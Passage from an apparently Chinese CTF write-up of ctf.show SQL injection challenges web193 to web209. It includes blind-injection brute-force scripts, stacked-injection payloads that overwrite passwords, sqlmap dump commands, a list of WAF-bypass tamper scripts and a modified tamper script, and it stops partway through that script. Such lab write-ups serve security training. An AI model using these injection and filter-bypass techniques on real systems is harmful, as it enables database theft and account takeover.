$ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;        die(json_encode($ret));    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这次将substr也过滤了，但可以用like</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport sysimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;37c2ceb1-a3e7-4a7b-a1ba-0617e56fa226.challenge.ctf.show&#x2F;api&#x2F;&quot;dict &#x3D; &quot;&#123;&#125;1234567890qwerty-uiopasdfghjklzxcvbnm_,&quot;flag &#x3D; &quot;&quot;for i in range(1,55):    for j in dict:        pay &#x3D; flag + j + &#39;%&#39;        #payload &#x3D; f&quot;admin&#39;and if((select database()) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #ctfshow_web        #payload &#x3D; f&quot;admin&#39;and if((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctfshow_web&#39;) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #ctfshow_flxg        #payload &#x3D; f&quot;admin&#39;and if((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #id,f1ag        payload &#x3D; f&quot;admin&#39;and if((select f1ag from ctfshow_flxg) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        data &#x3D; &#123;            &quot;username&quot;: payload,            &quot;password&quot;: 1        &#125;        res &#x3D; requests.post(url &#x3D; url,data &#x3D;data)        time.sleep(0.3)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:            flag &#x3D; flag + j            print(flag)            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h4><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr|char|left|right|substring&#x2F;i&#39;, $username))&#123;       $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;       die(json_encode($ret));   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这题虽然增加了一些过滤，但依旧没有过滤like，所以老规矩，直接用上一题的脚本：</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport sysimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;75beca13-5fe5-4ad9-bb11-9ffea4b1a791.challenge.ctf.show&#x2F;api&#x2F;&quot;dict &#x3D; &quot;&#123;&#125;1234567890qwerty-uiopasdfghjklzxcvbnm_,&quot;flag &#x3D; &quot;&quot;for i in range(1,55):    for j in dict:        pay &#x3D; flag + j + &#39;%&#39;        #payload &#x3D; f&quot;admin&#39;and if((select database()) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #ctfshow_web        #payload &#x3D; f&quot;admin&#39;and if((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctfshow_web&#39;) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #ctfshow_flxg        #payload &#x3D; f&quot;admin&#39;and if((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #id,f1ag        payload &#x3D; f&quot;admin&#39;and if((select f1ag from ctfshow_flxg) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        data &#x3D; &#123;            &quot;username&quot;: payload,            &quot;password&quot;: 1        &#125;        res &#x3D; requests.post(url &#x3D; url,data &#x3D;data)        time.sleep(0.3)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:            flag &#x3D; flag + j            print(flag)            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h4><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into&#x2F;i&#39;, $username))&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;    die(json_encode($ret));  &#125;  if($row[0]&#x3D;&#x3D;$password)&#123;      $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目说的是堆叠注入</p><p>堆叠注入：堆叠查询可以执行多条sql语句，语句之间以分号(;)隔开。而堆叠查询注入攻击就是利用此特点，在第二条语句中构造自己要执行的语句。</p><p>而题目中给的判断是只要登录成功就会给flag，那么可以利用update将pass更新为我们自己设置的密码，虽然题目中将空格过滤了，但可以用反引号`进行隔开，并且因为题中的sql的username的值并没有用单引号隔开，所以需要为数字即可，payload：</p><pre class="line-numbers language-none"><code class="language-none">username:0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;123456password:123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧if(preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into&#x2F;i&#39;, $username))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;  die(json_encode($ret));&#125;if(strlen($username)&gt;16)&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;用户名不能超过16个字符&#39;;  die(json_encode($ret));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次对username的长度进行了限制，看了wp才知道题目中过滤的是se1ect，并未过滤select，所以可以直接使用select，payload：</p><pre class="line-numbers language-none"><code class="language-none">username:1;select(22)password:22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h4><pre class="line-numbers language-none"><code class="language-none">if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set&#x2F;&#x2F;i&#39;, $username))&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;    die(json_encode($ret));  &#125;  if($row[0]&#x3D;&#x3D;$password)&#123;      $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看了南神的wp，还可以用show函数，因为我们已知一个表名，所以用show tables 列出所有表名，密码输入我们已知的表名即可登录成功payload:</p><pre class="line-numbers language-none"><code class="language-none">username:1;show tablespassword:ctfshow_user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h4><pre class="line-numbers language-none"><code class="language-none">if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop&#x2F;i&#39;, $username))&#123;   $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;   die(json_encode($ret)); &#125; if($row[0]&#x3D;&#x3D;$password)&#123;     $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题虽然再次增加了一些过滤，但依旧没有过滤show，继续使用上一题的payload</p><pre class="line-numbers language-none"><code class="language-none">username:1;show tablespassword:ctfshow_user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h4><pre class="line-numbers language-none"><code class="language-none">if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(&#x2F;i&#39;, $username))&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;    die(json_encode($ret));  &#125;  if($row[0]&#x3D;&#x3D;$password)&#123;      $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续上一题的payload</p><pre class="line-numbers language-none"><code class="language-none">username:1;show tablespassword:ctfshow_user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h4><pre class="line-numbers language-none"><code class="language-none">if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,&#x2F;i&#39;, $username))&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;    die(json_encode($ret));  &#125;  if($row[0]&#x3D;&#x3D;$password)&#123;      $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续上一题的payload</p><pre class="line-numbers language-none"><code class="language-none">username:1;show tablespassword:ctfshow_user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><h4 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h4><p>进入到对sqlmap的使用，先查询数据库：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&amp;page&#x3D;1&quot; --refer&#x3D;&quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;sqlmap.php&quot; --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据库为ctfshow_web</p><p>查询表名：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&amp;page&#x3D;1&quot; --refer&#x3D;&quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表名为ctfshow_user</p><p>再查询其中的列名</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&amp;page&#x3D;1&quot; --refer&#x3D;&quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_user --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为id、pass、username</p><p>再查询pass列名里的值</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&amp;page&#x3D;1&quot; --refer&#x3D;&quot;http:&#x2F;&#x2F;b7f01c9a-b042-4318-99c4-85fd8711ae17.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h4><p>题目提示使用–data参数，而在sqlmap中data参数是用post传参，payload;</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;sqlmap.php&quot; --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到数据库ctfshow_web</p><p>再查询其表名：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到表名：ctfshow_user</p><p>再查询其字段名</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_user --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>依旧是id、pass、username：</p><p>再查询pass中的内容</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer &quot;http:&#x2F;&#x2F;1c96b270-e969-425b-9271-db93947db622.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h4><p>题目提示使用sqlmap的method参数改变请求方式，payload：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;540ec1b4-0662-4636-be0b-9f2ed1dfcf7e.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --referer &quot;http:&#x2F;&#x2F;540ec1b4-0662-4636-be0b-9f2ed1dfcf7e.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看了wp才知道是用PUT方法，同时还要加上Content-Type头</p><h4 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h4><p>这一次是要求使用cookie提交数据，只需再上一个payload的基础上加上cookie即可，payload：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;26e63a8c-666f-4e3d-93d6-21f0b774dc4c.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;65if5r3kiffkbnhap36d5k8dp4; ctfshow&#x3D;62f0ed3bf93a314fe099219183b4d75e&quot; --referer &quot;http:&#x2F;&#x2F;26e63a8c-666f-4e3d-93d6-21f0b774dc4c.challenge.ctf.show&#x2F;sqlmap.php; UM_distinctid&#x3D;17cd43de779426-013ac9f6834b2e-b7a1438-144000-17cd43de77a4a8&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h4><p>题目提示需要api鉴权，不太明白，对其进行抓包后，发现多了一个getToken.php数据包，说明每次查询前会先访问getToken.php，而sqlmap中</p><pre class="line-numbers language-none"><code class="language-none">--safe-url 提供一个安全不错误的连接，每隔一段时间都会去访问一下--safe-freq 提供一个安全不错误的连接，设置每次注入测试前访问安全链接的次数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以payload：</p><p>查表名：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这一次多了一个表ctfshow_flax，其flag很有可能在其中</p><p>查字段：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flax --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现有flagx字段，直接查里面的内容：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer &quot;http:&#x2F;&#x2F;e4d19160-710e-40aa-9542-d685d50c1c7c.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flax -C flagx --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h4><p>题目提示sql需要闭合，但sqlmap会帮我们闭合，payload：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;f21f2f30-0c19-4a01-9d49-a39eeb9d8905.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;f21f2f30-0c19-4a01-9d49-a39eeb9d8905.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer &quot;http:&#x2F;&#x2F;f21f2f30-0c19-4a01-9d49-a39eeb9d8905.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flaxc -C flagv --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h4><p>题目提示tamper参数，而tamper可以引入用户自编译脚本来绕过过滤、黑名单、防火墙等</p><pre class="line-numbers language-none"><code class="language-none">举例如下：apostrophemask.py 用utf8代替引号equaltolike.py MSSQL * SQLite中like 代替等号greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号space2hash.py 空格替换为#号 随机字符串 以及换行符space2comment.py 用&#x2F;**&#x2F;代替空格apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤space2mssqlblank.py mssql空格替换为其它空符号base64encode.py 用base64编码space2mssqlhash.py mssql查询中替换空格modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释space2mysqlblank.py mysql中空格替换其它空白符号between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）multiplespaces.py 围绕SQL关键字添加多个空格space2plus.py 用+替换空格bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为likenonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾chardoubleencode.py 双url编码(不处理以编码的)unionalltounion.py 替换UNION ALL SELECT UNION SELECTcharencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写unmagicquotes.py 宽字符绕过 GPC addslashesrandomcomments.py 用&#x2F;**&#x2F;分割sql关键字charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码securesphere.py 追加特制的字符串versionedmorekeywords.py MySQL &gt;&#x3D; 5.1.13注释绕过halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>而题目刚好过滤了空格，可以使用space2randomblank.py 脚本来替换空格字符，payload：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;c53e197f-341c-43ce-aa55-ea91074fc730.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;c53e197f-341c-43ce-aa55-ea91074fc730.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment.py --referer &quot;http:&#x2F;&#x2F;c53e197f-341c-43ce-aa55-ea91074fc730.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤&#x2F;&#x2F; $id &#x3D; str_replace(&#39;select&#39;, &#39;&#39;, $id);  function waf($str)&#123;   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然对小写的select进行了过滤，但sqlmap中一般都是大写的select，继续使用上一题的payload：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;cac6878f-5807-4b8b-9133-de65af3dc9d5.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;cac6878f-5807-4b8b-9133-de65af3dc9d5.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment.py --referer &quot;http:&#x2F;&#x2F;cac6878f-5807-4b8b-9133-de65af3dc9d5.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤  function waf($str)&#123;   &#x2F;&#x2F;TODO 未完工   return preg_match(&#39;&#x2F; |\*|\&#x3D;&#x2F;&#39;, $str);  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一次过滤了空格、*号、=号，但我们可以自己改i脚本，将=换成like，空格换成0x9,</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token 